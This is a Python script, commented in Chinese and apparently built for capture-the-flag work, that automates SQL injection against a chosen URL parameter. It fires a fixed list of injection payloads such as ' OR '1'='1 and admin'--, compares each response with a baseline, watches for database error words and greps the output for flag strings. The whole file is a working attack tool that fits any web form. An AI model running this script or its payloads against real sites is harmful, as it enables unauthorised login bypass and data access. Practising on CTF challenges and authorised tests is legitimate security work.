#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL 注入检测工具"""

import urllib.request
import urllib.parse
import urllib.error
import re

# SQL 注入 payload
PAYLOADS = [
    ("' OR '1'='1", "basic_or"),
    ("' OR 1=1--", "comment_dash"),
    ("' OR 1=1#", "comment_hash"),
    ("admin'--", "admin_comment"),
    ("' OR ''='", "empty_or"),
    ("1' OR '1'='1", "numeric_or"),
    ("' OR 1=1-- -", "dash_space"),
    ("'", "single_quote"),
    ("\"", "double_quote"),
]


def check_flag(content: str) -> str:
    """检查 flag"""
    for pattern in [r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'ctf\{[^}]+\}']:
        match = re.search(pattern, content, re.IGNORECASE)
        if match:
            return match.group()
    return None


def send_request(url: str, method: str, params: dict, timeout: int):
    """发送请求"""
    try:
        if method == "GET":
            full_url = f"{url}?{urllib.parse.urlencode(params)}"
            req = urllib.request.Request(full_url, headers={
                'User-Agent': 'Mozilla/5.0'
            })
        else:
            data = urllib.parse.urlencode(params).encode('utf-8')
            req = urllib.request.Request(url, data=data, headers={
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            })
        
        response = urllib.request.urlopen(req, timeout=timeout)
        return response.getcode(), response.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        content = e.read().decode('utf-8', errors='ignore') if e.fp else ""
        return e.code, content
    except Exception as e:
        return 0, str(e)


def run(url: str, method: str = "POST", data: str = "", 
        inject_param: str = "", timeout: int = 10, **kwargs) -> dict:
    """
    执行 SQL 注入检测
    """
    method = method.upper()
    
    # 解析参数
    base_params = {}
    for pair in data.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            base_params[k] = v
    
    if inject_param not in base_params:
        return {
            "success": False,
            "error": f"参数 '{inject_param}' 不在数据中"
        }
    
    # 基准请求
    base_status, base_content = send_request(url, method, base_params, timeout)
    base_length = len(base_content)
    
    results = []
    vulnerable = False
    flag = None
    
    for payload, payload_type in PAYLOADS:
        test_params = base_params.copy()
        test_params[inject_param] = payload
        
        status, content = send_request(url, method, test_params, timeout)
        
        # 检查 flag
        found_flag = check_flag(content)
        if found_flag:
            flag = found_flag
            vulnerable = True
            results.append({
                "payload": payload,
                "type": payload_type,
                "status": status,
                "flag_found": True,
                "flag": found_flag
            })
            break
        
        # 判断是否存在注入
        length_diff = abs(len(content) - base_length)
        is_different = (
            status != base_status or
            length_diff > 50 or
            any(kw in content.lower() for kw in ['error', 'sql', 'syntax', 'query', 'mysql', 'warning'])
        )
        
        if is_different:
            vulnerable = True
            results.append({
                "payload": payload,
                "type": payload_type,
                "status": status,
                "length_diff": length_diff,
                "indicates_vuln": True
            })
    
    return {
        "url": url,
        "method": method,
        "inject_param": inject_param,
        "vulnerable": vulnerable,
        "results": results[:10],
        "base_status": base_status,
        "base_length": base_length,
        "flag": flag
    }
